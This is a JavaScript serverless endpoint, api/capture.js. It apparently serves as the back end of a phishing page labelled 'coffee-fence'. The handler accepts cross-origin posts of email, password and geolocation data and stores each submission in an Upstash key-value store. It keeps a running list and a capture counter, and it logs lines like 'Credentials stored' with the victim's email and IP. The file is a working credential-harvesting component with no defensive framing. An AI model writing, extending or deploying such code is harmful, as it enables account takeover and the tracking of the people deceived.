// api/capture.js — Receives credentials + geolocation, stores in Upstash KV

const UPSTASH_URL = process.env.KV_REST_API_URL;
const UPSTASH_TOKEN = process.env.KV_REST_API_TOKEN;
const KV_PREFIX = "coffee-fence";

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const data = req.body;

        if (!data || !data.email || !data.password) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        // Debug log to verify env vars
        console.log('[+] UPSTASH_URL:', UPSTASH_URL ? 'configured' : 'MISSING');
        console.log('[+] UPSTASH_TOKEN:', UPSTASH_TOKEN ? 'configured' : 'MISSING');

        const entryId = `entry_${Date.now()}_${Math.random().toString(36).substring(2, 10)}`;
        const key = `${KV_PREFIX}:${entryId}`;

        // 1. Store individual entry
        await upstashSet(key, JSON.stringify(data));

        // 2. Append to the all_entries list
        await appendToList(`${KV_PREFIX}:all_entries`, data);

        // 3. Increment counter
        await upstashIncr(`${KV_PREFIX}:total_captures`);

        console.log(`[+] Credentials stored: ${data.email} / ${data.ip}`);

        return res.status(200).json({ status: 'ok' });

    } catch (error) {
        console.error('[!] Capture error:', error.message);
        console.error('[!] Stack:', error.stack);
        return res.status(500).json({ 
            error: 'Internal server error',
            message: error.message,
            url: UPSTASH_URL ? 'set' : 'missing'
        });
    }
}

async function upstashSet(key, value) {
    const url = `${UPSTASH_URL}/set/${encodeURIComponent(key)}`;
    console.log('[+] SET URL:', url);
    const resp = await fetch(url, {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${UPSTASH_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(value)
    });
    return resp.json();
}

async function upstashGet(key) {
    const url = `${UPSTASH_URL}/get/${encodeURIComponent(key)}`;
    const resp = await fetch(url, {
        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
    });
    return resp.json();
}

async function upstashIncr(key) {
    const url = `${UPSTASH_URL}/incr/${encodeURIComponent(key)}`;
    const resp = await fetch(url, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
    });
    return resp.json();
}

async function appendToList(listKey, data) {
    const result = await upstashGet(listKey);
    let list = [];
    
    if (result.result) {
        try {
            list = JSON.parse(result.result);
        } catch(e) {
            list = [];
        }
    }
    
    if (!Array.isArray(list)) list = [];
    list.push(data);
    
    await upstashSet(listKey, JSON.stringify(list));
}
